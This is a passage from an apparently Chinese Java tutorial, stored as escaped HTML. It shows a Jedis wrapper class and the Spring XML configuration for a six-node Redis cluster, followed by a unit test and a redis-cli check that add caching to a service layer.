class=&quot;hljs-attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;host&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;192.168.25.153&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;constructor-arg&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;constructor-arg&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;port&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;6379&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;constructor-arg&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;bean&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;bean&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;id&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;jedisClientPool&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;com.taotao.jedis.手动配置的bean&quot;&lt;/span&gt;/&amp;gt;&lt;/span&gt; &lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;beans&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;注意：&lt;/code&gt;在spring中要使用注解，我们先要开启注解，&lt;code&gt;开启注解有两种方式&lt;/code&gt;：&lt;br/&gt;  方式一：配置&lt;code&gt;&amp;lt;context:annotation-config&amp;gt;&amp;lt;/context:annotation-config&amp;gt;&lt;/code&gt;注解，表示开启注解，但是不能扫描包。&lt;br/&gt;  方式二：配置包扫描器&lt;code&gt;&amp;lt;context:component-scan base-package=&quot;com.taotao.content.service&quot;&amp;gt;&amp;lt;/context:component-scan&amp;gt;&lt;/code&gt;注解，表示扫描所有需要带@Service注解的类，该配置做了两件事：既开启注解，又扫描包。&lt;br/&gt;所以我们只要配置了包扫描器，那么我们手动配置的bean就会在spring容器中加载。&lt;br/&gt;&lt;strong&gt;&lt;code&gt;特别注意：&lt;/code&gt;&lt;/strong&gt;&lt;br/&gt;  如果使用方式二，我们在加载配置文件的时候，要加载所有的配置文件才可以。（本案例中使用的是方式一）&lt;br/&gt;  如果使用方式一，我们在加载配置文件的时候，要加载单个的配置文件。&lt;/p&gt;
&lt;h4 id=&quot;h613redis&quot;&gt;&lt;span&gt;&lt;strong&gt;6.1.3、redis集群版实现类&lt;/strong&gt;&lt;/span&gt;&lt;/h4&gt;
&lt;pre readability=&quot;19.5&quot;&gt;
&lt;code class=&quot;hljs kotlin&quot; readability=&quot;33&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-class&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;JedisClientCluster&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;implements&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;JedisClient&lt;/span&gt; &lt;/span&gt;{&lt;p&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@Autowired&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;private&lt;/span&gt; JedisCluster jedisCluster;&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@Override&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; String &lt;span class=&quot;hljs-keyword&quot;&gt;set&lt;/span&gt;(String key, String value) {&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; jedisCluster.&lt;span class=&quot;hljs-keyword&quot;&gt;set&lt;/span&gt;(key, value);&lt;br/&gt;}&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@Override&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; String &lt;span class=&quot;hljs-keyword&quot;&gt;get&lt;/span&gt;(String key) {&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; jedisCluster.&lt;span class=&quot;hljs-keyword&quot;&gt;get&lt;/span&gt;(key);&lt;br/&gt;}&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@Override&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-built_in&quot;&gt;Boolean&lt;/span&gt; exists(String key) {&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; jedisCluster.exists(key);&lt;br/&gt;}&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@Override&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-built_in&quot;&gt;Long&lt;/span&gt; expire(String key, int seconds) {&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; jedisCluster.expire(key, seconds);&lt;br/&gt;}&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@Override&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-built_in&quot;&gt;Long&lt;/span&gt; ttl(String key) {&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; jedisCluster.ttl(key);&lt;br/&gt;}&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@Override&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-built_in&quot;&gt;Long&lt;/span&gt; incr(String key) {&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; jedisCluster.incr(key);&lt;br/&gt;}&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@Override&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-built_in&quot;&gt;Long&lt;/span&gt; hset(String key, String field, String value) {&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; jedisCluster.hset(key, field, value);&lt;br/&gt;}&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@Override&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; String hget(String key, String field) {&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; jedisCluster.hget(key, field);&lt;br/&gt;}&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@Override&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-built_in&quot;&gt;Long&lt;/span&gt; hdel(String key, String... field) {&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; jedisCluster.hdel(key, field);&lt;br/&gt;}&lt;br/&gt;}&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;添加此配置到applicationContext-redis.xml中&lt;/p&gt;
&lt;pre readability=&quot;5.5&quot;&gt;
&lt;code class=&quot;hljs xml&quot; readability=&quot;5&quot;&gt;&lt;span class=&quot;hljs-meta&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;beans&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;xmlns&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;http://www.springframework.org/schema/beans&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-attr&quot;&gt;xmlns:context&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;http://www.springframework.org/schema/context&quot;&lt;/span&gt; &lt;br/&gt;&lt;span class=&quot;hljs-attr&quot;&gt;xmlns:p&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;http://www.springframework.org/schema/p&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-attr&quot;&gt;xmlns:aop&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;http://www.springframework.org/schema/aop&quot;&lt;/span&gt; &lt;br/&gt;&lt;span class=&quot;hljs-attr&quot;&gt;xmlns:tx&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;http://www.springframework.org/schema/tx&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-attr&quot;&gt;xmlns:dubbo&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;http://code.alibabatech.com/schema/dubbo&quot;&lt;/span&gt; &lt;br/&gt;&lt;span class=&quot;hljs-attr&quot;&gt;xmlns:xsi&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;http://www.w3.org/2001/XMLSchema-instance&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-attr&quot;&gt;xsi:schemaLocation&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;http://www.springframework.org/schema/beans &lt;br/&gt;http://www.springframework.org/schema/beans/spring-beans-4.2.xsd&lt;br/&gt;http://www.springframework.org/schema/context &lt;br/&gt;http://www.springframework.org/schema/context/spring-context-4.2.xsd&lt;br/&gt;http://www.springframework.org/schema/aop &lt;br/&gt;http://www.springframework.org/schema/aop/spring-aop-4.2.xsd &lt;br/&gt;http://www.springframework.org/schema/tx &lt;br/&gt;http://www.springframework.org/schema/tx/spring-tx-4.2.xsd&lt;br/&gt;http://code.alibabatech.com/schema/dubbo &lt;br/&gt;http://code.alibabatech.com/schema/dubbo/dubbo.xsd&lt;br/&gt;http://www.springframework.org/schema/util &lt;br/&gt;http://www.springframework.org/schema/util/spring-util-4.2.xsd&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;p&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;bean&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;id&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;jedisCluster&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;redis.clients.jedis.JedisCluster&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;constructor-arg&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;set&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;bean&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;redis.clients.jedis.HostAndPort&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;constructor-arg&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;host&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;192.168.25.153&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;constructor-arg&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;constructor-arg&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;port&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;7001&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;constructor-arg&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;bean&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;bean&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;redis.clients.jedis.HostAndPort&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;constructor-arg&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;host&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;192.168.25.153&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;constructor-arg&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;constructor-arg&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;port&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;7002&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;constructor-arg&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;bean&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;bean&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;redis.clients.jedis.HostAndPort&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;constructor-arg&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;host&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;192.168.25.153&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;constructor-arg&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;constructor-arg&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;port&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;7003&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;constructor-arg&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;bean&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;bean&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;redis.clients.jedis.HostAndPort&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;constructor-arg&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;host&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;192.168.25.153&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;constructor-arg&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;constructor-arg&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;port&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;7004&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;constructor-arg&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;bean&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;bean&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;redis.clients.jedis.HostAndPort&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;constructor-arg&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;host&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;192.168.25.153&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;constructor-arg&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;constructor-arg&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;port&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;7005&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;constructor-arg&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;bean&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;bean&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;redis.clients.jedis.HostAndPort&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;constructor-arg&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;host&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;192.168.25.153&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;constructor-arg&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;constructor-arg&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;port&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;7006&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;constructor-arg&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;bean&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;set&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;constructor-arg&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;bean&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;bean&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;id&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;jedisClientCluster&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;com.taotao.jedis.JedisClientCluster&quot;&lt;/span&gt;/&amp;gt;&lt;/span&gt; &lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;beans&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;注意：单机版和集群版不能共存，使用单机版时注释集群版的配置。使用集群版，把单机版注释。&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&quot;h62&quot;&gt;&lt;span&gt;&lt;strong&gt;6.2、封装代码测试&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;策略设计模式的优势，只要切换实现类（即简单注释下spring配置文件），不需修改测试类。&lt;br/&gt;测试代码：&lt;/p&gt;
&lt;pre readability=&quot;6&quot;&gt;
&lt;code class=&quot;hljs cs&quot; readability=&quot;6&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;JedisSpringTest&lt;/span&gt; {&lt;p&gt;@&lt;span class=&quot;hljs-function&quot;&gt;Test&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;testJedisClient&lt;/span&gt;() throws Exception &lt;/span&gt;{&lt;br/&gt;ApplicationContext applicationContext = &lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; ClassPathXmlApplicationContext(&lt;span class=&quot;hljs-string&quot;&gt;&quot;classpath:spring/applicationContext-*.xml&quot;&lt;/span&gt;);&lt;br/&gt;JedisClient jedisClient = applicationContext.getBean(JedisClient.class);&lt;br/&gt;jedisClient.&lt;span class=&quot;hljs-keyword&quot;&gt;set&lt;/span&gt;(&lt;span class=&quot;hljs-string&quot;&gt;&quot;first&quot;&lt;/span&gt;, &lt;span class=&quot;hljs-string&quot;&gt;&quot;100&quot;&lt;/span&gt;);&lt;br/&gt;String result = jedisClient.&lt;span class=&quot;hljs-keyword&quot;&gt;get&lt;/span&gt;(&lt;span class=&quot;hljs-string&quot;&gt;&quot;first&quot;&lt;/span&gt;);&lt;br/&gt;System.&lt;span class=&quot;hljs-keyword&quot;&gt;out&lt;/span&gt;.println(result);             &lt;br/&gt;}&lt;br/&gt;}&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;命令行中进行测试如下：没有问题&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs ruby&quot;&gt;[root@itheima bin]&lt;br/&gt;&lt;span class=&quot;hljs-meta&quot;&gt;127.0.0.1:7001&amp;gt;&lt;/span&gt; get first&lt;br/&gt;-&amp;gt; Redirected to slot [&lt;span class=&quot;hljs-number&quot;&gt;11149&lt;/span&gt;] located at &lt;span class=&quot;hljs-number&quot;&gt;192.168&lt;/span&gt;.&lt;span class=&quot;hljs-number&quot;&gt;25.153&lt;/span&gt;&lt;span class=&quot;hljs-symbol&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;hljs-number&quot;&gt;7003&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-string&quot;&gt;&quot;100&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-meta&quot;&gt;192.168.25.153:7003&amp;gt;&lt;/span&gt; &lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;h63&quot;&gt;&lt;span&gt;&lt;strong&gt;6.3、向业务逻辑中添加缓存&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;由于我们处于开发阶段，所以我们先将我们的连接方式切换为单机版。&lt;/p&gt;
&lt;h4 id=&quot;h631&quot;&gt;&lt;span&gt;&lt;strong&gt;6.3.1、功能分析&lt;/strong&gt;&lt;/span&gt;&lt;/h4&gt;
